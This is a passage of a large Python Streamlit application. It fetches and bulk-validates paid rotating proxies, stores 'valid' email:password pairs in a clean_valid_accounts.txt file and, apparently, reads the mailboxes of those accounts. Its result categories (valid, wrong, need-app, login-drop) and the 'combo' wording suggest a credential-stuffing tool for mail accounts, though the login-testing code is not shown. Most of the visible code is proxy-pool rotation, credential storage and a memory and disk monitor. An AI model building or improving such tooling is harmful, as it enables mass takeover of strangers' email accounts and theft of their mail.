                        f"- validating against it")
    except Exception as _e:
        return fallback, (f"queue target {cand[0]}:{cand[1]} does NOT answer from this "
                          f"host ({type(_e).__name__}) - validating on the 443 control "
                          f"instead, so a dead destination cannot read as a dead pool")


def fetch_and_test_all_proxies(silent: bool = False):
    """Fetch every configured provider's lines, validate them, write proxies.txt
    and ARM the live pool.  Returns (alive_count, total_count).

    FIX PERF-3: the batch was ONE as_completed() call under a 276s budget on the
    Streamlit script thread, so the page was dead for minutes with a spinner and
    no numbers. It now runs in chunks with a progress bar.
    FIX PERF-5: the 0-alive TCP fallback was a SERIAL loop of is_proxy_alive()
    calls - 92 nodes x 5s is ~460s of dead page. It is pooled now.
    FIX 407-SCOPE: the completion line no longer calls a TCP-alive fallback line
    "validated" - it reports the counts separately.
    FIX POOL-DUP: the survivor list is collapsed to one entry per credential pair.

    FIX KEY-1 (v13.58): THE LINE-TO-KEY ASSOCIATION WAS THROWN AWAY. fetch_ws()
    was mapped over WEBSHARE_KEYS and the returned lines were flattened into one
    list on the next line, so nothing downstream could say WHICH API key a bad
    node belonged to - and you cannot delete a key you cannot identify. Each line
    now carries the index of the key that produced it, the map is kept in STATE
    and written to proxy_key_map.json, and every table names the key.

    FIX ISO-6 (v13.59): the map, the raw backup and the probe budget are per user
    now - they follow the same unlocked prefix as proxies.txt.

    FIX FETCH-2 (v13.62): 24-line chunks against a 144s chunk budget, on a pool
    whose real concurrency is the per-sub-user gate, meant every chunk timed out
    and _run_batch returned only what happened to finish - the rest were abandoned
    and counted dead. The whole budget was len(raw)*3.0 for ~1700s of real work.
    Now: width from the pool's own sub-user count, chunk = one wave, budget from
    real concurrency, nothing abandoned, and every non-pass gets a second gated
    pass. Speed from phase 1; truth from phase 2.

    FIX FETCH-3 / FETCH-4: a 402 is kept, the target must actually answer, the
    override goes to the OWNER copy, dead IPs fail fast, and phase 2 uses the real
    gate width instead of a hardcoded 3.
    """
    global all_proxies, filtered_pool

    if requests is None:
        if not silent:
            str_lit.error("Missing 'requests' library.")
        return (0, 0)

    log_startup("Bulk fetch & test of Webshare / Oxylabs proxies started.")
    all_raw = []
    keymap = {}

    def fetch_ws(item):
        """PAGINATE.  Reading page 1 and stopping loses every later line."""
        idx, key = item
        proxies = []
        try:
            page = 1
            while page <= 20:
                r = requests.get(
                    "https://proxy.webshare.io/api/v2/proxy/list/",
                    params={"mode": "direct", "page": page, "page_size": 250},
                    headers={"Authorization": f"Token {key}"}, timeout=8)
                if r.status_code != 200:
                    log_startup(f"Fetch: key #{idx + 1} answered HTTP {r.status_code} "
                                f"on page {page} - stopping that key.", quiet=True)
                    break
                data = r.json() or {}
                results = data.get("results") or []
                for item2 in results:
                    ip, port = item2.get("proxy_address"), item2.get("port")
                    user, pwd = item2.get("username"), item2.get("password")
                    if ip and port:
                        line = (f"{user}:{pwd}@{ip}:{port}" if user and pwd
                                else f"{ip}:{port}")
                        proxies.append((line, idx))
                nxt = data.get("next")
                if not nxt or not results or len(results) < 250:
                    break
                page += 1
        except Exception as e:
            warnings.warn(f"Failed fetching Webshare proxy key #{idx + 1}: {e}")
        if not proxies:
            log_startup(f"Fetch: key #{idx + 1} returned NO proxy lines - it is dead, "
                        f"revoked, or has no sub-users.", quiet=True)
        return proxies

    try:
        with ThreadPoolExecutor(max_workers=5) as executor:
            for res in executor.map(fetch_ws, list(enumerate(WEBSHARE_KEYS))):
                for _line, _idx in res:
                    keymap.setdefault(_line, _idx)
                    all_raw.append(_line)
    except Exception as e:
        warnings.warn(f"ThreadPool Webshare fetch error: {e}")

    for _ol in OXYLABS_PROXIES:
        keymap.setdefault(_ol, -1)
    all_raw.extend(OXYLABS_PROXIES)
    all_raw = list(dict.fromkeys(all_raw))
    total = len(all_raw)

    # Keep the association. _US survives a rerun; the JSON survives a restart.
    _US["proxy_key_map"] = keymap
    try:
        with file_write_lock:
            with open(CFG["PROXY_KEYMAP_FILE"], "w", encoding="utf-8") as _kmf:
                json.dump(keymap, _kmf, indent=1)
    except Exception as _kme:
        log_startup(f"WARNING: could not write proxy_key_map.json: {_kme}")

    if not all_raw:
        log_startup("Fetch & test: no proxy line returned.")
        if not silent:
            str_lit.warning("No proxies returned. Check WEBSHARE_KEYS in secrets.")
        return (0, 0)

    # The write below replaces proxies.txt with ONLY the survivors, so a
    # provider-wide 407 could shrink your pool with no way back.  proxies_all.txt
    # is the way back - and there is a Restore button.
    try:
        with file_write_lock:
            with open(CFG["PROXY_ALL_FILE"], "w", encoding="utf-8") as _bf:
                _bf.write("\n".join(str(i) for i in all_raw) + ("\n" if all_raw else ""))
        log_startup(f"Backed up the raw fetched pool to proxies_all.txt ({len(all_raw)} line(s)).")
    except Exception as _bex:
        log_startup(f"WARNING: could not write proxies_all.txt: {_bex}")

    clear_tunnel_cache()
    with probe_stats_lock:
        probe_stats.clear()
    clear_proxy_quarantine()

    # FIX SCORE-5: a full re-test re-measures every line, so stale fail counts
    # from a previous provider state must not survive into the new scores.
    with proxy_lock:
        for _p in all_raw:
            _m = proxy_meta.setdefault(
                _p, {"fails": 0, "success": 0, "country": "Unknown",
                     "region": "Unknown", "latency_ms": 0})
            _m["fails"] = 0
            _m["score"] = compute_real_score(_m.get("success", 0), 0)

    # ---- the target swap, on the OWNER copy AND the process mirror -------------
    _us_ov = _user_state()
    _prev_owner_ov = list(_us_ov.get("probe_targets_override") or [])
    _prev_state_ov = list(STATE.get("probe_targets_override") or [])
    _targets, _target_why = _fetch_targets(_prev_owner_ov or _prev_state_ov)
    log_startup(f"Fetch & test target: {_target_why}")
    log_probe_event(f"fetch target -> {[t[0] + ':' + str(t[1]) for t in _targets]} ({_target_why})")
    try:
        _us_ov["probe_targets_override"] = _targets
        STATE["probe_targets_override"] = _targets
    except Exception:
        pass

    alive = []
    _ft_timed_out = False

    # ---- the width: 3 in flight per SUB-USER, never below 4, never above 24 ----
    _subs = set()
    _ips = set()
    for _bp in all_raw:
        _bi = parse_proxy(_bp)
        if not _bi:
            continue
        _bu = (_bi.get("user") or "").strip().lower()
        if _bu:
            _subs.add(_bu)
        if _bi.get("host"):
            _ips.add(_bi["host"])
    _n_sub = max(1, len(_subs))
    _n_ip = max(1, len(_ips))
    _burst = max(4, min(24, _n_sub * 3))
    # Phase 2 is GATE-limited, so it is budgeted on the gate width, not on 3.
    try:
        _p2_width = max(4, min(int(live_cfg().get("PROXY_CONCURRENCY",
                                                  PROXY_CONCURRENCY_DEFAULT)),
                               _n_ip * int(live_cfg().get("PROXY_IP_CONCURRENCY",
                                                          PROXY_IP_CONCURRENCY_DEFAULT)),
                               _n_sub * int(live_cfg().get("PROXY_SUBUSER_CONCURRENCY",
                                                           PROXY_SUBUSER_CONCURRENCY_DEFAULT))))
    except Exception:
        _p2_width = 4
    try:
        _per_line = max(6.0, float(probe_timeout()) + 2.0)
    except Exception:
        _per_line = 10.0
    batch_timeout = max(
        90.0, min(PROBE_BATCH_MAX * 3.0, (total / _burst) * _per_line * 1.5))
    log_startup(
        f"Fetch & test plan: {total} line(s) over {_n_sub} sub-user(s) / {_n_ip} IP(s) "
        f"-> phase-1 burst {_burst} (~{total / _burst * _per_line:.0f}s), then phase 2 "
        f"at gate width {_p2_width} on the ambiguous answers only. Budget {batch_timeout:.0f}s.")
    log_probe_event(
        f"fetch plan: total={total} subusers={_n_sub} ips={_n_ip} burst={_burst} "
        f"p2={_p2_width} budget={batch_timeout:.0f}s")

    _started = time.time()
    _pbar = None
    try:
        _pbar = str_lit.progress(0.0, text=f"Phase 1 - burst validating 0/{total} ...")
    except Exception:
        _pbar = None

    try:
        # ---- PHASE 1: speed. Gates bypassed, chunk = exactly one wave. -------
        for _i in range(0, total, _burst):
            _left = batch_timeout - (time.time() - _started)
            if _left <= 1.0:
                _ft_timed_out = True
                break
            _part = all_raw[_i:_i + _burst]
            _got, _ = _run_batch(
                _burst_probe, _part, _burst,
                min(_left, max(8.0, len(_part) * _per_line * 2.0)))
            alive.extend(_got)
            _done_n = min(total, _i + _burst)
            _eta = max(0.0, (total - _done_n) / _burst * _per_line)
            if _pbar is not None:
                try:
                    _pbar.progress(
                        _done_n / max(1, total) * 0.7,
                        text=f"Phase 1 - burst validating {_done_n}/{total} - "
                             f"{len(alive)} passed - ~{_eta:.0f}s left")
                except Exception:
                    pass

        # ---- PHASE 2: truth. Every non-pass, under the REAL gates. -----------
        # Only what a burst can CAUSE is re-tested: auth and timeout. A format
        # error, a blocked line, a TCP-dead host and a 402 are not ambiguous -
        # 402 is already kept by phase 1, and re-dialling the rest is waste.
        try:
            with probe_stats_lock:
                _snap_reason = {_k: (_v.get("reason") or "")
                                for _k, _v in probe_stats.items()}
        except Exception:
            _snap_reason = {}
        _alive_set = set(alive)
        _ambiguous = [_p for _p in all_raw
                      if _p not in _alive_set
                      and _snap_reason.get(_p) in ("auth", "timeout")]
        if _ambiguous:
            _p2_budget = max(
                60.0, min(PROBE_BATCH_MAX, (len(_ambiguous) / _p2_width) * _per_line * 1.5))
            log_startup(
                f"Phase 2: {len(_ambiguous)} line(s) answered 407 or timed out under the "
                f"burst - re-testing at gate width {_p2_width} (budget {_p2_budget:.0f}s). "
                f"These are the only ones a burst can get wrong.")
            log_probe_event(f"phase 2: re-testing {len(_ambiguous)} ambiguous line(s) "
                            f"at width {_p2_width}")
            _p2_started = time.time()
            for _j in range(0, len(_ambiguous), _p2_width):
                _p2_left = _p2_budget - (time.time() - _p2_started)
                if _p2_left <= 1.0:
                    log_startup("Phase 2 budget spent - the rest stay out of the pool "
                                "and keep their ambiguous verdict.")
                    break
                _p2_part = _ambiguous[_j:_j + _p2_width]
                _p2_got, _ = _run_batch(
                    precheck_proxy_fast, _p2_part, _p2_width,
                    min(_p2_left, max(8.0, len(_p2_part) * _per_line * 2.5)))
                for _p2p in _p2_got:
                    if _p2p not in _alive_set:
                        _alive_set.add(_p2p)
                        alive.append(_p2p)
                _p2_done = min(len(_ambiguous), _j + _p2_width)
                if _pbar is not None:
                    try:
                        _pbar.progress(
                            0.7 + 0.3 * (_p2_done / max(1, len(_ambiguous))),
                            text=f"Phase 2 - confirming {_p2_done}/{len(_ambiguous)} "
                                 f"ambiguous line(s) - {len(alive)} kept in total")
                    except Exception:
                        pass
    finally:
        # Restore BOTH copies - the owner one is what probe_targets() actually
        # reads, and the process mirror is what blocks 077/105 compare through.
        try:
            _user_state()["probe_targets_override"] = _prev_owner_ov
        except Exception:
            pass
        try:
            STATE["probe_targets_override"] = _prev_state_ov
        except Exception:
            pass
        if _pbar is not None:
            try:
                _pbar.empty()
            except Exception:
                pass

    if _ft_timed_out:
        log_startup(f"Fetch & test: total budget {batch_timeout:.0f}s spent; keeping "
                    f"the {len(alive)} node(s) that finished.")

    alive = list(dict.fromkeys(alive))

    # FIX POOL-DUP + v13.58: one entry per (host:port, SUB-USER) pair, so every
    # API key you pay for keeps its own line. See _collapse_by_hostport in block 074.
    try:
        with probe_stats_lock:
            _psnap = {k: (v.get("reason") or "") for k, v in probe_stats.items()}
    except Exception:
        _psnap = {}
    if alive:
        _before = len(alive)
        alive = _collapse_by_hostport(alive, _psnap)
        if len(alive) != _before:
            _ips_seen = len({(parse_proxy(p) or {}).get("host") for p in alive})
            _subs_seen = len({((parse_proxy(p) or {}).get("user") or "").lower()
                              for p in alive})
            log_startup(f"Fetch & test: {_before} line(s) collapsed to {len(alive)} "
                        f"line(s) over {_ips_seen} IP(s) and {_subs_seen} sub-user(s) "
                        f"- one entry per credential pair, no per-IP cap.")

    # FIX FETCH-3: report the 402-kept count apart from the real passes, because
    # the completion line used to call every kept line "PASSED".
    _n_plan = sum(1 for _p in alive if _psnap.get(_p) == "plan")
    _n_passed = len(alive) - _n_plan
    validated = len(alive)

    if not alive:
        _pt = float(CFG.get("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT))

        def _tcp_ok(p):
            info = parse_proxy(p)
            if not info:
                return False
            return is_proxy_alive(info["host"], info["port"], timeout=_pt)

        tcp_ok, _ = _run_batch(_tcp_ok, all_raw, probe_workers(bulk=True),
                               max(30.0, len(all_raw) * 1.0))
        alive = tcp_ok or all_raw
        log_startup(f"Fetch & test: 0 of {total} node(s) passed the tunnel probe. "
                    f"Falling back to {len(alive)} line(s) that only answer on TCP - "
                    f"these are NOT validated and will be re-probed.")

    try:
        with file_write_lock:
            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                f.write("\n".join(str(i) for i in alive) + ("\n" if alive else ""))
    except Exception as ex:
        str_lit.error(f"Failed to write proxies file: {ex}")

    # ARM THE POOL: no cold re-probe needed at Start
    with alive_pool_lock:
        alive_pool[:] = list(alive)
    try:
        enrich_proxy_geo(alive)
    except Exception:
        pass
    save_proxy_meta()
    _US["last_probe_ts"] = time.time()
    _US["probe_runs"] = int(_US.get("probe_runs", 0)) + 1
    _US["bootstrap_done"] = True

    try:
        mail_dest_spot_check(force=True)
    except Exception as _mse:
        log_probe_event(f"mail-dest spot check failed: {_mse}")

    all_proxies = load_proxies()
    filtered_pool = get_filtered_active_proxies(quiet=True)

    _unval = max(0, len(alive) - validated)
    log_startup(f"Fetch & test complete: {_n_passed} node(s) PASSED, {_n_plan} kept on a "
                f"402 (alive, out of bandwidth), {_unval} unvalidated TCP-alive kept, "
                f"{len(alive)} written and ARMED from {total} line(s).")
    return (len(alive), total)
# @@END 077 FETCH_AND_TEST

# @@BLOCK 078 CLEAN_VALID_IO deps=039
CLEAN_VALID_FILE = user_file("clean_valid_accounts.txt")
# v13.51: its own lock, so the read-merge-rewrite is atomic without nesting the
# results file_write_lock (which block 107 already holds when it calls in).
_clean_lock = STATE.setdefault("clean_lock", threading.Lock())


def _read_clean_valid():
    """email(lower) -> password, for whatever is on disk right now."""
    seen = {}
    try:
        if os.path.exists(CLEAN_VALID_FILE):
            with open(CLEAN_VALID_FILE, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or ":" not in line:
                        continue
                    em, rest = line.split(":", 1)
                    em = em.strip().lower()
                    if em and em not in seen:
                        seen[em] = rest.split("|")[0].strip()
    except Exception:
        pass
    return seen


def _write_clean_valid(header, valids):
    """Merge `valids` into clean_valid_accounts.txt and rewrite the file.

    v13.51: returns (stored_total, this_run_count).  It used to return the
    merged LIFETIME total only, and block 107 stored that as the run's
    clean_valid_count - so the number the UI showed was every account ever
    stored, not the ones this run found.
    """
    run_count = 0
    with _clean_lock:
        merged = _read_clean_valid()
        for v in valids or []:
            if ":" not in v:
                continue
            em, rest = v.split(":", 1)
            em = em.strip().lower()
            if not em:
                continue
            merged[em] = rest.split("|")[0].strip()
            run_count += 1
        try:
            with file_write_lock:
                with open(CLEAN_VALID_FILE, "w", encoding="utf-8") as f:
                    f.write(header)
                    for em in sorted(merged):
                        f.write(f"{em}:{merged[em]}\n")
        except Exception:
            pass
    return len(merged), run_count
# @@END 078 CLEAN_VALID_IO

# @@BLOCK 079 STARTUP_PANEL_UI deps=007,034,037,038,039
section_title("🖥️", "Startup & Under-The-Hood Display Panel",
              "system boot, config injection, proxy health, engine state transitions")

with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood",
                      expanded=False):
    str_lit.markdown("Real-time activity ledger recording system boot, config injection, "
                     "proxy health checks, and engine state transitions:")
    str_lit.code("\n".join(startup_panel_lines()), language="text")
    col_st1, col_st2 = str_lit.columns(2)
    with col_st1:
        if str_lit.button("🔄 Refresh Startup Screen"):
            str_lit.rerun()
    with col_st2:
        if str_lit.button("🧹 Clear Startup Logs"):
            str_lit.session_state.startup_entries = []
            # FIX ISO-5 (v13.50): _STARTUP_BUFFER is PROCESS state, so a blanket
            # clear() also deleted the OTHER user's quiet-mode lines - which their
            # session list does not hold, so their panel and diagnostic bundle lost
            # lines they never asked to lose. Keep every entry that is not stamped
            # with this caller's owner and drop only our own.
            # _STARTUP_SEEN holds bare messages with no owner, so it is still
            # cleared wholesale; the cost is at most one re-logged duplicate line
            # on the other session, never a lost one.
            _clear_who = _startup_who()
            with _STARTUP_BUFFER_LOCK:
                _keep = [i for i in _STARTUP_BUFFER
                         if not (isinstance(i, (list, tuple)) and len(i) == 2
                                 and i[0] == _clear_who)]
                _STARTUP_BUFFER[:] = _keep
                _STARTUP_SEEN.clear()
            log_startup("Startup logs cleared by user.")
            str_lit.rerun()

# ==========================================================================
# v13.63 - RESOURCE MONITOR (RAM / DISK), FILE BROWSER, PER-USER HISTORY
#
# NOTE FOR THIS FILE: streamlit is imported as str_lit (block 001), so every
# call here is str_lit.<x>. A bare st.<x> is a NameError at import time.
#
# v13.63b - FOUR DEFECTS IN THE FIRST DRAFT, ALL FIXED HERE
# ---------------------------------------------------------
#  1. _res_own_files() only collected FILES in the working directory plus files
#     under data/<prefix>/. Results live in <prefix>_mail_results/, which is a
#     DIRECTORY, so os.path.isfile() rejected it and nothing inside was ever
#     listed - no valid_ / wrong_ / failed_ / unfinished_live.json - and both
#     result deletes were silent no-ops. A prefixed DIRECTORY is walked now.
#  2. THE PANEL SLAMMED SHUT ON EVERY CLICK. The body sat inside an expander,
#     which keeps no state, so each rerun collapsed it. The gate is a CHECKBOX
#     with a key: it persists, so the body stays open while you work.
#  3. "Clear ticks" popped widget keys. Popping a key whose widget is re-created
#     in the same run is unreliable; it ASSIGNS False now, which is
#     deterministic. Orphaned keys are swept on an owner change.
#  4. "Delete ticked" looked broken because it is disabled until the confirm
#     toggle is on, and nothing said so. A caption says so.
#  Also removed: _res_snapshot() built a "top" list nothing read any more.
#
# v13.70 - FIVE MORE, ALL FIXED HERE
# ----------------------------------
#  5. _res_disk() was called TWICE per snapshot, once for each figure, so the
#     two halves of one row could describe two different instants - and statvfs
#     is a syscall on a shared filesystem. One call, both figures.
#  6. "Disk total" was the HOST overlay presented as if it were the app's own
#     quota. It is relabelled "Filesystem total (shared host disk)", the free
#     figure is the actionable one and gets its own used bar.
#  7. The RAM bar divided memory.current by the limit and called the result
#     "RAM used", hiding the RSS the process can actually give back. The bar
#     still uses the killer's own figure - but it says so - and RSS, peak and
#     the headroom in bytes are printed beside it.
#  8. _RES_KEEP_SUFFIX did not list notifications.jsonl or notify_seen.json, so
#     "Delete my cache files" wiped the whole notification history and reset the
#     badge. Both filenames are on the keep list now.
#  9. _res_forget_ticks only ASSIGNED False, so every deleted file left a dead
#     reschk_* key and a dead entry in the uid map behind for the life of the
#     session. Both are POPPED now - safe, because these are callbacks and run
#     before the checkboxes are re-created.
#
# WHAT IS AND IS NOT PER USER - stated here because the numbers are easy to
# misread:
#
#   * RAM is NOT per user. Every session on this deployment shares ONE process
#     and ONE container, so VmRSS and the cgroup figure belong to everybody.
#     The part that IS attributable to one user is their SESSION PAYLOAD - their
#     result lists, report entries, logs, paste buffer, cached prefilter - and
#     that is the part that actually drives the OOM kills. It is the only part
#     "Free my RAM" touches, and it touches nothing on disk.
#   * "ROM" is disk, and on Streamlit Cloud it is EPHEMERAL. Free space is
#     container-wide; the FILES are per user because they carry the unlocked
#     prefix, so yours are viewable and deletable and nobody else's are.
#
# ISOLATION CONTRACT FOR EVERY DELETE AND EVERY DOWNLOAD:
#   _res_own_files() is the ONLY source of paths. It is a listdir filtered on
#   os.path.basename(user_file("")) - the unlocked prefix. The selection
#   callbacks then INTERSECT that list again before acting, so even a stale
#   widget-key map cannot reach a file outside this user's prefix.
#
# THE HISTORY IS STORED, one JSON object per line, in this user's own file.
# Streamlit has no background scheduler, so a sample is taken when the script
# runs - throttled to one per minute, forced by the button, capped at
# _MEM_MAX_LINES. It grows only while the tab is in use and says so on screen.
#
# Everything degrades to "?" rather than raising: /proc and the cgroup files do
# not exist off Linux, and a monitor must never be the reason a page dies.
#
# Readings are cached for 3s. The body runs on EVERY rerun, and a listdir plus a
# walk per keystroke is exactly the kind of per-rerun cost this file has already
# been bitten by.
# ==========================================================================
_RES_SESSION_KEYS = (
    "valid_results", "wrong_results", "need_app_results", "login_drop_results",
    "conn_results", "proxy_results", "retry_results", "rbl_results",
    "smtp_results", "dns_results", "skip_results", "unknown_results",
    "log_lines", "report_entries", "startup_entries", "pre_dns_failed",
    "pre_smtp_failed", "bb_reader_msgs", "_dbg_log", "_res_dl",
)
# Never deleted by the cache sweep: the working pool, the stored history, and
# everything that is a preference rather than a rebuildable artefact.
# FIX KEEP-LIST (v13.69): reader_state.json and disposable_domains.txt were
# missing, so "Delete my cache files" wiped the Mailbox Reader's remembered
# account (the picker fell back to the first valid combo) and deleted the
# fetched disposable blocklist, which then had to be re-downloaded from GitHub.
# reader_state is a preference like theme.json; the disposable list is
# REBUILDABLE but only over the network, so it belongs on the keep side too.
# v13.70: notifications.jsonl and notify_seen.json were the same story - the
# sweep took the entire alert history and the seen marker with it, so the badge
# reset to zero and every past RAM/disk warning vanished on the next load.
_RES_KEEP_SUFFIX = (
    "clean_valid_accounts.txt", "settings.json", "paste_accounts.txt",
    "inspect_cat.txt", "theme.json", "download_presets.json", "proxies.txt",
    "mem_history.jsonl", "reader_state.json", "disposable_domains.txt",
    "notifications.jsonl", "notify_seen.json",
)

_MEM_FILE = user_file("mem_history.jsonl")
_MEM_MAX_LINES = 1500
_MEM_SAMPLE_SECONDS = 60.0
_MEM_CHART_POINTS = 120
_PREVIEW_BYTES = 200000
# FIX PREVIEW-CAP (v13.69): _res_prev is trimmed to the newest N entries AND to
# a byte budget. The entry cap alone allowed 300 x 200 KB, i.e. tens of MB of
# strings living in session_state - which is the payload that causes the OOM
# kills, not the entry count.
# v13.70: 300 entries / 8 MB was still a 8 MB ceiling held in a 1 GB container
# for a preview nobody scrolls back to. 80 / 3 MB.
_PREVIEW_CACHE_ENTRIES = 80
_PREVIEW_CACHE_BYTES = 3000000
# v13.63: the results directory is <hash>_mail_results, NOT mail_results - the
# basename is prefixed like every other per-user path. Testing for the bare name
# meant "Delete my cache files" skipped nothing and took the results with it,
# while "Delete my RESULT files" only ever matched clean_valid.
_RES_DIR_NAME = os.path.basename(user_file("mail_results"))

# v13.63: OWNER GATE. After Forget passkey and a second unlock in this tab,
# session_state still holds the previous user's snapshot, throttle stamp, ticks
# and staged download - so the new user saw the previous user's FILENAMES and
# could have downloaded the previous user's bytes. Cleared before any widget.
_RES_OWNER_KEY = "_res_owner"
_res_owner = _cache_owner()
if str_lit.session_state.get(_RES_OWNER_KEY) != _res_owner:
    for _k in ("_res_snap", "_mem_last", "_res_flash", "_res_uids",
               "_res_prev", "_res_dl"):
        str_lit.session_state.pop(_k, None)
    for _k in [k for k in list(str_lit.session_state.keys())
               if str(k).startswith("reschk_")]:
        str_lit.session_state.pop(_k, None)
    str_lit.session_state[_RES_OWNER_KEY] = _res_owner

# Seeded, not defaulted: a keyed widget given a default AND a session value is
# the "created with a default value but also had its value set via the Session
# State API" warning.
for _k in ("res_open", "res_confirm"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = False


def _res_fmt(n):
    """Human bytes, or "?" when the reading is genuinely unavailable.

    v13.70: a missing reading used to arrive here as 0 and render "0 B", which
    reads as a real zero - "no RAM in use". Anything that is not a number is
    "?" now, and 0 renders "0 B" only when it really is zero.
    """
    try:
        n = float(n)
    except Exception:
        return "?"
    if n < 1024:
        return f"{int(n)} B"
    if n < 1024 ** 2:
        return f"{n / 1024:.0f} KB"
    if n < 1024 ** 3:
        return f"{n / (1024 ** 2):.1f} MB"
    return f"{n / (1024 ** 3):.2f} GB"


def _res_uid(path):
    """A stable, filesystem-independent widget-key fragment for one path."""
    return re.sub(r"[^A-Za-z0-9]+", "_", str(path))[-70:]


def _res_proc_mem():
    """(rss_bytes, peak_bytes) for THIS PROCESS. (0, 0) off Linux."""
    rss = peak = 0
    try:
        with open("/proc/self/status", encoding="utf-8", errors="ignore") as _fh:
            for _line in _fh:
                if _line.startswith("VmRSS:"):
                    rss = int(_line.split()[1]) * 1024
                elif _line.startswith("VmHWM:"):
                    peak = int(_line.split()[1]) * 1024
                if rss and peak:
                    break
    except Exception:
        pass
    return rss, peak


def _res_cgroup_read(paths):
    for _p in paths:
        try:
            with open(_p, encoding="utf-8", errors="ignore") as _fh:
                _raw = _fh.read().strip()
            if not _raw:
                continue
            if _raw == "max":
                return 0
            _n = int(_raw)
            if 0 < _n < (1 << 62):
                return _n
        except Exception:
            continue
    return 0


def _res_cgroup_limit():
    return _res_cgroup_read(("/sys/fs/cgroup/memory.max",
                             "/sys/fs/cgroup/memory/memory.limit_in_bytes"))


def _res_cgroup_used():
    return _res_cgroup_read(("/sys/fs/cgroup/memory.current",
                             "/sys/fs/cgroup/memory/memory.usage_in_bytes"))


def _res_disk():
    try:
        _v = os.statvfs(os.getcwd())
        return _v.f_blocks * _v.f_frsize, _v.f_bavail * _v.f_frsize
    except Exception:
        return 0, 0


def _res_session_bytes():
    """Approximate bytes this session is holding in session_state."""
    _ss = str_lit.session_state
    _total = 0
    for _k in _RES_SESSION_KEYS:
        _v = _ss.get(_k)
        if not _v:
            continue
        try:
            if isinstance(_v, str):
                _total += len(_v)
            elif isinstance(_v, (bytes, bytearray)):
                _total += len(_v)
            elif isinstance(_v, dict):
                for _kk, _vv in _v.items():
                    _total += len(str(_kk)) + len(repr(_vv))
            elif isinstance(_v, (list, tuple, set)):
                for _item in _v:
                    _total += len(_item) if isinstance(_item, str) else len(repr(_item))
            else:
                _total += len(repr(_v))
        except Exception:
            continue
    try:
        _total += len(_ss.get("bb_raw_text") or "")
    except Exception:
        pass
    # FIX SESS-BYTES (v13.69): the preview cache and the tick map were never
    # counted, so "My session payload" under-reported exactly the two things
    # that grow largest - and the preview cache is what FIX PREVIEW-CAP above
    # now bounds. Counted here the same rough way as the rest: the preview text
    # and note only, never the whole tuple.
    try:
        _prev = _ss.get("_res_prev")
        if isinstance(_prev, dict):
            for _pv in _prev.values():
                _total += len(_pv[1] or "") + len(_pv[2] or "")
    except Exception:
        pass
    try:
        _uids = _ss.get("_res_uids")
        if isinstance(_uids, dict):
            for _uk, _uv in _uids.items():
                _total += len(str(_uk)) + len(str(_uv))
    except Exception:
        pass
    return _total


def _res_own_files():
    """Every file on disk carrying THIS user's prefix. Never another user's.

    v13.63b: a prefixed DIRECTORY is walked. It was files-only, so
    <prefix>_mail_results - where every result, the resume record and the
    clean-valid merge file actually live - was rejected by os.path.isfile() and
    never listed at all.
    """
    _pfx = os.path.basename(user_file("")) or ""
    _out = []
    if not _pfx:
        return _out
    _root = os.getcwd()
    try:
        for _name in os.listdir(_root):
            if not _name.startswith(_pfx + "_"):
                continue
            _full = os.path.join(_root, _name)
            if os.path.isfile(_full):
                _out.append(_full)
            elif os.path.isdir(_full):
                for _walk_root, _dirs, _files in os.walk(_full):
                    for _fn in _files:
                        _out.append(os.path.join(_walk_root, _fn))
    except Exception:
        pass
    try:
        for _walk_root, _dirs, _files in os.walk(os.path.join(_root, "data", _pfx)):
            for _fn in _files:
                _out.append(os.path.join(_walk_root, _fn))
    except Exception:
        pass
    return _out


def _res_is_result_file(path):
    """True for a file inside THIS user's results directory."""
    if not _RES_DIR_NAME:
        return False
    return os.path.basename(os.path.dirname(path)) == _RES_DIR_NAME


def _res_snapshot():
    _now = time.time()
    _cached = str_lit.session_state.get("_res_snap") or {}
    if _cached and (_now - _cached.get("ts", 0.0)) < 3.0:
        return _cached
    _rss, _peak = _res_proc_mem()
    _own = _res_own_files()
    _own_b = 0
    for _p in _own:
        try:
            _own_b += os.path.getsize(_p)
        except Exception:
            pass
    # v13.70: ONE statvfs. It used to be called twice, once per figure, so the
    # total and the free value in one row could be measured at two instants.
    _d_total, _d_free = _res_disk()
    _snap = {
        "ts": _now,
        "rss": _rss,
        "peak": _peak,
        "lim": _res_cgroup_limit(),
        "used": _res_cgroup_used(),
        "d_total": _d_total,
        "d_free": _d_free,
        "sess": _res_session_bytes(),
        "own_n": len(_own),
        "own_b": _own_b,
    }
    str_lit.session_state["_res_snap"] = _snap
    return _snap


def _res_delete(paths):
    _gone = 0
    for _p in paths:
        try:
            os.remove(_p)
            _gone += 1
        except Exception:
            pass
    return _gone


def _res_preview(path):
    """(text, note). 200 KB cap, cached on (mtime, size). Never raises.

    ANY file type is viewable: a binary file is decoded with errors=replace and
    labelled, so a zip still shows its header bytes instead of an error.
    """
    _cache = str_lit.session_state.get("_res_prev")
    if not isinstance(_cache, dict):
        _cache = {}
    try:
        _st = os.stat(path)
        _sig = (_st.st_mtime, _st.st_size)
        _size = _st.st_size
    except Exception:
        return None, "unreadable (stat failed)"
    _hit = _cache.get(path)
    if _hit and _hit[0] == _sig:
        return _hit[1], _hit[2]
    try:
        with open(path, "rb") as _fh:
            _head = _fh.read(_PREVIEW_BYTES)
    except Exception as _e:
        return None, f"read failed: {_e}"
    _binary = b"\x00" in _head[:4096]
    _text = _head.decode("utf-8", errors="replace")
    if _binary:
        _note = (f"binary - first {len(_head):,} of {_size:,} bytes decoded as text; "
                 f"download it for the real bytes")
    elif _size > len(_head):
        _note = f"first {len(_head):,} of {_size:,} bytes"
    else:
        _note = f"{_size:,} bytes"
    _cache[path] = (_sig, _text, _note)
    # FIX PREVIEW-CAP (v13.69): the entry ceiling is kept, and a byte ceiling is
    # added beside it. Oldest goes first, and at least the entry just added
    # always survives.
    if len(_cache) > _PREVIEW_CACHE_ENTRIES:
        _cache = dict(list(_cache.items())[-_PREVIEW_CACHE_ENTRIES:])
    if len(_cache) > 1:
        try:
            _held = sum(len(_pv[1] or "") for _pv in _cache.values())
            while _held > _PREVIEW_CACHE_BYTES and len(_cache) > 1:
                _oldest = next(iter(_cache))
                _held -= len(_cache[_oldest][1] or "")
                _cache.pop(_oldest, None)
        except Exception:
            pass
    str_lit.session_state["_res_prev"] = _cache
    return _text, _note


def _res_selected_paths():
    """Ticked paths, INTERSECTED with this user's own files again."""
